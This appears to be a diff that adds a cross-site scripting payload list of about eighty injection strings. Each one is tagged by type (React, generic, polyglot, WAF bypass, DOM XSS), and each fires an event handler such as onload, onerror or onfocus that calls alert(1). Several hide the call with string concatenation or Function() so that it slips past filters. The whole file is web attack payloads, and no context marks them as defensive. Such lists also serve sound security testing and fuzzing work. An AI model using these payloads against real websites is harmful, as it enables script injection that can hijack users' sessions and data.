@@ -1,0 +1,80 @@
+[EVENT_HANDLERS] [REACT] ` onLoad={alert(1)}
+[EVENT_HANDLERS] [REACT] " onLoad={alert(1)}
+[EVENT_HANDLERS] [REACT] ' onLoad={alert(1)}
+[EVENT_HANDLERS] [REACT] ` onFocus={alert(1)}
+[EVENT_HANDLERS] [REACT] " onError={alert(1)}
+[EVENT_HANDLERS] [REACT] ` onError={alert(1)}
+[EVENT_HANDLERS] [REACT] " onFocus={alert(1)}
+[EVENT_HANDLERS] [REACT] ' onError={alert(1)}
+[EVENT_HANDLERS] [REACT] ' onClick={alert(1)}
+[EVENT_HANDLERS] [REACT] ' onFocus={alert(1)}
+[EVENT_HANDLERS] [REACT] ` onClick={alert(1)}
+[EVENT_HANDLERS] [GENERIC] <svg onload=alert(1)>
+[EVENT_HANDLERS] [GENERIC] <svg/onload=alert(1)>
+[EVENT_HANDLERS] [REACT] ' onMouseOver={alert(1)}
+[EVENT_HANDLERS] [REACT] " onMouseOver={alert(1)}
+[EVENT_HANDLERS] [GENERIC] <body onload=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] ' onclick=alert(1) a=
+[EVENT_HANDLERS] [REACT] ` onMouseOver={alert(1)}
+[EVENT_HANDLERS] [POLYGLOT] " onclick=alert(1) a=
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=alert(1)
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=alert`1`>
+[EVENT_HANDLERS] [POLYGLOT] '><svg onload=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] "><svg onload=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg/onload=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] '><body onload=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <body/onload=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] "><body onload=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=alert(1)//>
+[EVENT_HANDLERS] [GENERIC] <img src=x onerror=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <svg onload=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <div onclick=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <body onload=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=alert(1)
+[EVENT_HANDLERS] [EVENT_HANDLERS] <style onload=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <span onclick=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=alert`1`>
+[EVENT_HANDLERS] [WAF_BYPASS] <img/src=x onerror=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <iframe onload=alert(1)>
+[EVENT_HANDLERS] [DOM_XSS] #"><img src=x onerror=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <button onclick=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] '"><img src=x onerror=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] "><img src=x onerror=alert(1);>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <div ondblclick=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=alert(1)//>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <div onmouseover=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <textarea oninput=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=top['al'+'ert'](1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=self['al'+'ert'](1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=this['al'+'ert'](1)>
+[EVENT_HANDLERS] [GENERIC] <keygen autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <img onerror=alert(1) src=x>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <a href="#" onclick=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <video onerror=alert(1) src=x>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=window['al'+'ert'](1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <audio onerror=alert(1) src=x>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=parent['al'+'ert'](1)>
+[EVENT_HANDLERS] [GENERIC] <video src=x onerror=alert(1)></video>
+[EVENT_HANDLERS] [GENERIC] <audio src=x onerror=alert(1)></audio>
+[EVENT_HANDLERS] [POLYGLOT] "><keygen autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] '><keygen autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <body/onload=&lt;!--&gt;&#10alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <object onerror=alert(1) data="x">
+[EVENT_HANDLERS] [POLYGLOT] "><audio src=x onerror=alert(1)></audio>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <input autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [POLYGLOT] '><audio src=x onerror=alert(1)></audio>
+[EVENT_HANDLERS] [WAF_BYPASS] <svg onload=Function('al'+'ert(1)')()>
+[EVENT_HANDLERS] [POLYGLOT] '><video src=x onerror=alert(1)></video>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=top['al'+'ert'](1)>
+[EVENT_HANDLERS] [POLYGLOT] "><video src=x onerror=alert(1)></video>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=this['al'+'ert'](1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <button autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <select autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=self['al'+'ert'](1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <input type="text" oninput=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <textarea autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=window['al'+'ert'](1)>
+[EVENT_HANDLERS] [WAF_BYPASS] <img src=x onerror=parent['al'+'ert'](1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <input type="submit" onclick=alert(1)>
+[EVENT_HANDLERS] [EVENT_HANDLERS] <a href="#" autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] [GENERIC] <iframe srcdoc="<img src=x onerror=alert(1)>">
